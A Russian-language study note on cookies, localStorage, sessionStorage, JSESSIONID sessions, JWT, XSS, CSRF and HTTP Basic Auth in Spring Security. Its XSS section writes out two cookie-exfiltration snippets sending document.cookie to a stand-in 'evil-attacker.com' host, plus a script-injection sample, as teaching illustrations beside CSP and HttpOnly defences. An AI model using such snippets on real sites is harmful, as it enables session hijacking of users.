>[!question]- Зачем клиенту вообще что-то хранить
>HTTP **stateless**: каждый запрос для сервера независим, сервер не помнит, что было в прошлом запросе. После логина следующий запрос — для сервера «незнакомец».
>
>Значит, клиент должен **в каждом запросе** приносить доказательство «я тот, кто залогинился». Это доказательство (id сессии или токен) надо где-то хранить между запросами — отсюда cookie / localStorage / sessionStorage.
>
>Spring Security — это и есть про то, **как сервер по этому доказательству узнаёт пользователя** и решает, пускать ли его.

>[!question]- Cookie — что это и кто её шлёт
>Cookie — небольшая пара `имя=значение`, которую **сервер** просит браузер сохранить:
>```
>Set-Cookie: JSESSIONID=ABC123; HttpOnly; Secure; SameSite=Lax
>```
>Дальше браузер **сам, автоматически** добавляет её в каждый запрос на тот же домен:
>```
>Cookie: JSESSIONID=ABC123
>```
>
>Ключевое: cookie отправляется **без участия JS-кода**, браузер делает это сам. Именно поэтому на cookie построены сессии — и именно поэтому возможен CSRF (см. ниже).

>[!question]- Атрибуты cookie — что важно для безопасности
>Это не «настройки для красоты», от них напрямую зависит, можно ли украсть/подделать доступ.
>
>| Атрибут | Что делает | Зачем для Spring Security |
>|---|---|---|
>| `HttpOnly` | cookie **не видна из JavaScript** (`document.cookie` её не отдаст) | защита от кражи через XSS; `JSESSIONID` Spring ставит `HttpOnly` |
>| `Secure` | шлётся только по HTTPS | не утечёт по открытому HTTP |
>| `SameSite=Strict/Lax/None` | слать ли cookie при переходе с **чужого** сайта | главный встроенный тормоз для CSRF |
>| `Domain` / `Path` | на какие домены/пути слать | ограничивает область действия |
>| `Max-Age` / `Expires` | срок жизни; без них — «сессионная» (до закрытия браузера) | время жизни логина |
>
>`SameSite`:
>- `Strict` — cookie не уйдёт вообще ни при каком переходе с другого сайта.
>- `Lax` (дефолт в современных браузерах) — уйдёт только при обычном GET-переходе по ссылке.
>- `None` — шлётся всегда (обязателен `Secure`).

>[!question]- Сессия и JSESSIONID — это дефолт Spring Security
>Дефолтный режим Spring Security — **серверные сессии**:
>1. Логинишься → сервер создаёт объект сессии **у себя в памяти** (твои данные, роли) и кладёт ему id.
>2. Сервер шлёт `Set-Cookie: JSESSIONID=<id>`.
>3. Браузер хранит cookie и шлёт `JSESSIONID` в каждом запросе.
>4. Сервер по id находит сессию → знает, кто ты.
>
>То есть на клиенте лежит **только id (ключик)**, а сами данные — на сервере. Cookie — это «номерок от гардероба», а не само пальто.
>
>Поэтому при дефолтной настройке после `curl -u user:pass` в браузере ты логинишься один раз, а дальше ходишь по `JSESSIONID` без повторного ввода пароля.

>[!question]- localStorage и sessionStorage — чем отличаются от cookie
>Это хранилища браузера, доступные **только из JavaScript** (`localStorage.getItem(...)`). Сервер их не видит и автоматически **не получает** — фронт должен сам достать значение и вручную положить, например, в заголовок:
>```
>Authorization: Bearer <jwt>
>```
>
>- **localStorage** — живёт, пока не удалишь (переживает перезапуск браузера).
>- **sessionStorage** — живёт, пока открыта вкладка; закрыл вкладку — стёрлось.
>
>Сюда чаще всего кладут **JWT** в stateless-схеме (когда сервер сессий не держит). Тогда «доказательство» — это сам токен, а не номерок сессии.

>[!question]- Cookie vs localStorage vs sessionStorage — одна таблица
>
>| | Cookie | localStorage | sessionStorage |
>|---|---|---|---|
>| Кто шлёт на сервер | браузер сам, автоматически | никто — только вручную из JS | никто — только вручную из JS |
>| Доступ из JS | нет, если `HttpOnly` | да | да |
>| Объём | ~4 КБ | ~5–10 МБ | ~5–10 МБ |
>| Срок жизни | до `Expires`/закрытия | до удаления | до закрытия вкладки |
>| Типичное применение | `JSESSIONID`, сессии | JWT, настройки | временные данные вкладки |
>| Угроза | CSRF (+ XSS, если не `HttpOnly`) | XSS | XSS |

>[!question]- пример XSS на фронте
>При загрузке страницы с комментариями у жертвы может выполняться скрипт 
>```
>fetch('https://evil-attacker.com' + encodeURIComponent(document.cookie)); 
>```
>который отдает злоумышленнику секретные данные жертвы
>Spring Security решает через запрет делать запросы на другие сайты и может стирать <script></script> при чтении из БД с помощью Spring + Thymeleaf , иил так : 
>```
>@Configuration
>@EnableWebSecurity
>public class SecurityConfig {
>@Bean
>public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
>http.headers(headers -> headers.contentSecurityPolicy(csp -> csp
>// Разрешаем скрипты только с нашего сайта, запрещаем fetch на сторонние домены
>.policyDirectives("default-src 'self'; script-src 'self'; connect-src 'self';")
>));
>return http.build();
>```
> или через 
> ```
> server.servlet.session.cookie.http-only=true
> ```
>Через создание картинки: Скрипт динамически создает на странице невидимое изображение. Браузер пытается его загрузить и сам отправляет куки в адресе ссылки:
>```
>let img = new Image();
>img.src = 'https://evil-attacker.com' + document.cookie;
>```
>в строку поиска хакер вводит 
>```
><p>Результаты по запросу: <script>alert('Уязвимость!')</script></p>
>```

>[!question]- XSS и CSRF — почему угроза зависит от способа хранения
>Две разные атаки, и выбор хранилища решает, какая тебе грозит.
>
>**XSS** Аббревиатура **XSS** расшифровывается как ==**Cross-Site Scripting**==  ,"X" нужен чтбы не получилось CSS, (внедрение чужого JS на твою страницу): чужой скрипт читает всё, до чего дотянется JS.
>- localStorage / sessionStorage → читаются из JS → **JWT можно украсть**.
>- cookie с `HttpOnly` → из JS **не видна** → украсть сложнее. Плюс cookie в пользу сессий.
>
>**CSRF** - подделка запроса (cross-site-request-forgery), (чужой сайт втихую шлёт запрос на твой сервер от твоего имени): работает именно потому, что **браузер сам прикладывает cookie**.
>- Сессия на cookie → уязвима к CSRF → поэтому Spring Security **по умолчанию включает CSRF-защиту** (токен на форму) и есть `SameSite`.
>- JWT в `Authorization`-заголовке → браузер его сам не шлёт → CSRF почти не грозит, но зато токен открыт XSS.
>
>Вывод: **нет идеального хранилища** — cookie меняет XSS на CSRF, localStorage наоборот. Spring Security под сессии даёт CSRF-защиту из коробки именно по этой причине.

>[!question]- Где «кто я» при разных способах аутентификации
>
>| Способ | Что хранит клиент | Где | Держит ли сервер состояние |
>|---|---|---|---|
>| HTTP Basic | логин\:пароль (браузер кеширует на сессию) | память браузера | нет |
>| Form login + сессия (дефолт) | `JSESSIONID` | cookie | **да**, сессия в памяти сервера |
>| JWT (stateless) | сам токен | localStorage или cookie | нет, всё в токене |
>
>- **Basic** — пароль шлётся (в base64) каждый раз; ничего на сервере не хранится. Это то, что ты делал через `curl -u`.
>- **Сессия** — клиент держит только номерок, сервер держит состояние. Дефолт Spring Security.
>- **JWT** — состояние «зашито» в подписанный токен, сервер ничего не хранит (см. [[JWT]]).

# Basic Auth: как браузер запоминает credentials

>[!question]- Что Spring отправляет после успешного логина — и почему браузер запоминает сам
>**Spring ничего специального не отправляет.** Браузер запоминает credentials сам — это его реализация RFC 7617, не фича Spring.
>
>Полный диалог:
>```
>1. Браузер → Spring:  GET /some/path          (без credentials)
>
>2. Spring → Браузер:  401 Unauthorized
>                      WWW-Authenticate: Basic realm="Realm"
>                      ↑ сигнал браузеру: «нужен Basic Auth»
>
>3. [Браузер показывает нативное окошко логин/пароль]
>
>4. Браузер → Spring:  GET /some/path
>                      Authorization: Basic dXNlcjp0b24=
>
>5. Spring → Браузер:  200 OK
>                      (никаких специальных заголовков «запомни меня»)
>```
>После шага 5 браузер сам решает: «успешно прошёл с этими credentials на этот origin с realm="Realm" — буду добавлять их автоматически». Единственное, что делает Spring для запуска процесса — `WWW-Authenticate: Basic realm="Realm"` в шаге 2.
>
>**Что такое base64 в Authorization-заголовке:**
>```
>Authorization: Basic dXNlcjp0b24=
>                      ↑ base64("user:ton") — декодируется мгновенно
>```
>Base64 — кодировка, **не шифрование**. Для безопасности не даёт почти ничего:
>
>| Угроза | Basic Auth защищает? |
>|---|---|
>| Перехват трафика (MITM) | ❌ пароль читается тривиально |
>| Повтор запроса (replay) | ❌ украл заголовок → используй сколько угодно |
>| Пароль летит каждый раз | ❌ да, с каждым запросом |
>
>Вывод: Basic Auth = **только поверх HTTPS**. В продакшене для людей не используют — только machine-to-machine (API-ключи, CI/CD).

>[!question]- Что такое origin и зачем он нужен
>**Origin = протокол + хост + порт.** Все три части должны совпасть.
>
>```
>http://localhost:6253   ← твой origin
>http://localhost:8080   ← другой origin (другой порт)
>https://localhost:6253  ← другой origin (другой протокол)
>http://example.com      ← другой origin (другой хост)
>```
>
>Браузер кеширует Basic Auth credentials **per origin + realm**. Запомнил `user:ton` для `http://localhost:6253` с realm `"Realm"` — на `http://localhost:8080` спросит заново.
>
>Это та же граница, по которой работает **Same-Origin Policy (SOP)** — почему JS на `evil.com` не может читать данные с `bank.ru`. Origin — базовая единица доверия браузера, по ней ограничиваются: cookies (атрибут `Domain`), кеш credentials, JS-запросы (CORS).
>
>Срок жизни кеша Basic Auth credentials — до закрытия вкладки/окна (browser session). Кнопки «выйти» нет — только закрыть вкладку или очистить кеш вручную. Именно поэтому для пользовательских интерфейсов используют form login + сессия (там есть `POST /logout`).
